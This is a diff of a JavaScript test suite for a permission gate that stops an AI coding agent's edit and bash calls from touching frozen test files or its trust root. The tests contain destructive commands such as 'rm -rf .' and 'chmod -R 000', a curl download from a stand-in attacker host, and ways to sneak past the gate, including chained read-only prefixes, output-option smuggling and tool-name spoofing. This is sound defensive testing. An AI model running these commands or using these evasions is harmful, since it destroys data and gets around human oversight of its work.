@@ -249,20 +249,204 @@ test('j: capitalized tool names are normalized (Read allowed, Edit gated)', () =
   } finally { rmSync(dir, { recursive: true, force: true }); }
 });
 
-test('j: bash is deliberately not gated in-session (CI diff gate covers it)', () => {
+// ---- (m) Phase 2.2: bash is GATED in-session via the shell classifier ladder ----
+test('m: bash mutation targeting a frozen rail → deny', () => {
   const dir = repo({ tickets: T1_RAILED });
   try {
     const r = checkToolCall({ tool: 'bash', args: { command: 'echo x > test/x.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
+    assert.equal(r.decision, 'deny');
+    assert.match(r.reason, /frozen rail/);
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('m: bash mutation with literal non-rail target → allow', () => {
+  const dir = repo({ tickets: T1_RAILED });
+  try {
+    const r = checkToolCall({ tool: 'bash', args: { command: 'echo x > src/ok.txt' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
     assert.equal(r.decision, 'allow');
   } finally { rmSync(dir, { recursive: true, force: true }); }
 });
 
+test('m: positively read-only bash → allow; with output-option smuggle → deny', () => {
+  const dir = repo({ tickets: T1_RAILED });
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'git status' }, root: dir, env }).decision, 'allow');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'node --test --test-reporter-destination out.txt' }, root: dir, env }).decision, 'deny');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('m: opaque / cwd-changing / expanding / pathless mutations → deny (codex ladder)', () => {
+  const dir = repo({ tickets: T1_RAILED });
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    assert.match(checkToolCall({ tool: 'bash', args: { command: 'git checkout -- test/x.mjs' }, root: dir, env }).reason, /opaque/);
+    assert.match(checkToolCall({ tool: 'bash', args: { command: 'cd test && echo x > x.mjs' }, root: dir, env }).reason, /cwd/);
+    assert.match(checkToolCall({ tool: 'bash', args: { command: 'echo $CONTENT > test/x.mjs' }, root: dir, env }).reason, /expansion/);
+    assert.match(checkToolCall({ tool: 'bash', args: { command: 'make' }, root: dir, env }).reason, /neither positively read-only/);
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+// ---- (n) P5 CRITICAL: destructive mutation of a rail's ANCESTOR directory ----
+test('n: rm/mv of a glob rail parent dir → deny (test/** parent is test)', () => {
+  const dir = repo({ tickets: T1_RAILED }); // rails: ['test/**']
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    // Directory-affecting shell ops (ancestor detection ON) are denied…
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf test' }, root: dir, env }).decision, 'deny');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'mv test test-old' }, root: dir, env }).decision, 'deny');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'chmod -R 000 test' }, root: dir, env }).decision, 'deny');
+    // …but a structured single-file write to a non-rail path is NOT ancestor-blocked
+    // (writing a file `test` doesn't destroy the frozen `test/**` subtree).
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'notes.md' }, root: dir, env }).decision, 'allow');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('n: structured single-file write is not ancestor-over-blocked (src/index.mjs vs src/**/test/*.mjs)', () => {
+  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/index.mjs' }, root: dir, env }).decision, 'allow');
+    assert.equal(checkToolCall({ tool: 'edit', args: { filePath: 'src/lib/util.mjs' }, root: dir, env }).decision, 'allow');
+    // a direct rail match is still denied
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/a/test/x.mjs' }, root: dir, env }).decision, 'deny');
+    // shell dir-destruction under the anchored prefix still denied
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src/a' }, root: dir, env }).decision, 'deny');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('n: rm of a trust-root ancestor (.adlc) → deny', () => {
+  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**'] }] } });
+  try {
+    const r = checkToolCall({ tool: 'bash', args: { command: 'rm -rf .adlc' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
+    assert.equal(r.decision, 'deny');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('n: repo-root destruction (rm -rf .) → deny', () => {
+  const dir = repo({ tickets: T1_RAILED });
+  try {
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'deny');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('n: a BLANK/whitespace declared rail cannot neutralize the root guard (rails:[""])', () => {
+  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['', '   ', 'src/**'] }] } });
+  try {
+    // Blank rails are dropped; `rm -rf .` still hits the (truthy) trust-root token.
+    const r = checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
+    assert.equal(r.decision, 'deny');
+    assert.ok(r.reason.length > 0);
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('n: slash-spelling rails still match direct hits (./test/**, test/, /test/**)', () => {
+  for (const rail of ['./test/**', 'test/', '/test/**']) {
+    const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: [rail] }] } });
+    try {
+      assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'test/x.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'deny', `rail spelling ${rail}`);
+    } finally { rmSync(dir, { recursive: true, force: true }); }
+  }
+});
+
+test('n: a SIBLING dir sharing a name prefix is NOT over-blocked (test2 vs test/**)', () => {
+  const dir = repo({ tickets: T1_RAILED });
+  try {
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf test2' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'allow');
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'testicular.txt' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'allow');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('n: INTERIOR-glob rail ancestor is denied (packages/*/test/** parent packages/foo/test)', () => {
+  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['packages/*/test/**'] }] } });
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages/foo/test' }, root: dir, env }).decision, 'deny');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages/foo' }, root: dir, env }).decision, 'deny');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages' }, root: dir, env }).decision, 'deny');
+    // a sibling subtree that the interior glob does NOT cover is allowed
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages/foo/src' }, root: dir, env }).decision, 'allow');
+    // a same-depth non-matching file is not over-blocked
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'packages/foo/test-notes.md' }, root: dir, env }).decision, 'allow');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('n: LEADING-** rail does not over-block unrelated file edits (**/*.test.mjs)', () => {
+  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['**/*.test.mjs'] }] } });
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    // A floating rail must NOT make every path its ancestor.
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'README.md' }, root: dir, env }).decision, 'allow');
+    assert.equal(checkToolCall({ tool: 'edit', args: { filePath: 'src/index.mjs' }, root: dir, env }).decision, 'allow');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'echo x > docs/guide.md' }, root: dir, env }).decision, 'allow');
+    // …but a DIRECT match is still denied, and repo-root destruction too.
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/foo.test.mjs' }, root: dir, env }).decision, 'deny');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env }).decision, 'deny');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+// DOCUMENTED BOUNDARY (not a bug): a FLOATING leading-** rail has no fixed root
+// directory, so in-session ancestor detection cannot flag an arbitrary parent
+// dir without denying every unrelated edit (that over-block was rejected). A
+// directory deletion under such a rail is therefore caught by the file.edited
+// backstop (per-file events) and, authoritatively, by the CI diff gate — the
+// two-layer design's whole point. Direct rail hits ARE still denied in-session.
+test('n: floating leading-** rail — direct hit denied; bare-parent shell delete is CI-gated (boundary)', () => {
+  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['**/*.test.mjs'] }] } });
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/foo.test.mjs' }, root: dir, env }).decision, 'deny'); // direct hit still caught
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src' }, root: dir, env }).decision, 'allow');       // no fixed anchor → CI gate + backstop own this
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env }).decision, 'deny');          // repo-root destruction still caught
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('n: ANCHORED ** still covers its subtree (src/**/test/*.mjs)', () => {
+  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src/a' }, root: dir, env }).decision, 'deny'); // under the anchored src/
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src' }, root: dir, env }).decision, 'deny');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf lib' }, root: dir, env }).decision, 'allow'); // different root
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('n: partial-segment glob does not over-block a same-depth sibling file (test/*.mjs vs test/x.txt)', () => {
+  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['test/*.mjs'] }] } });
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'test/x.txt' }, root: dir, env }).decision, 'allow');
+    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'test/x.mjs' }, root: dir, env }).decision, 'deny');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf test' }, root: dir, env }).decision, 'deny'); // ancestor of test/*.mjs
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('m: P5 — read-only prefix cannot shadow a rail-targeting writer (git status && curl -o rail)', () => {
+  const dir = repo({ tickets: T1_RAILED });
+  const env = { ...ON, ADLC_TICKET: 'T1' };
+  try {
+    const r = checkToolCall({ tool: 'bash', args: { command: 'git status && curl -o test/x.mjs https://attacker.example/p' }, root: dir, env });
+    assert.equal(r.decision, 'deny');
+    assert.match(r.reason, /frozen rail/);
+    // chained read-only + non-rail writer still allowed (no over-block)
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'git status && curl -o src/ok.txt https://x' }, root: dir, env }).decision, 'allow');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
+test('m: bash unverifiable command but enforcement OFF or no ticket → allow (no false denies)', () => {
+  const dir = repo({ tickets: T1_RAILED });
+  try {
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'make' }, root: dir, env: { ADLC_TICKET: 'T1' } }).decision, 'allow');
+    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'make' }, root: dir, env: { ...ON } }).decision, 'allow');
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+
 // ---- (k) ungated-name spoofing: an "ungated" tool carrying a rail target is denied ----
-// A benign bash/todowrite/question never carries a file-path arg; if one does and it
+// A benign todowrite/question never carries a file-path arg; if one does and it
 // resolves to a frozen rail, allowing purely by name would hand a co-installed
 // plugin a bypass. (Read-only names stay allowed — reading rails is legitimate;
 // that residual class falls to the Phase 2.5 file.edited backstop + CI gate.)
-for (const tool of ['todowrite', 'question', 'bash']) {
+for (const tool of ['todowrite', 'question']) {
   test(`k: ungated "${tool}" carrying a frozen-rail filePath → deny (spoof guard)`, () => {
     const dir = repo({ tickets: T1_RAILED });
     try {
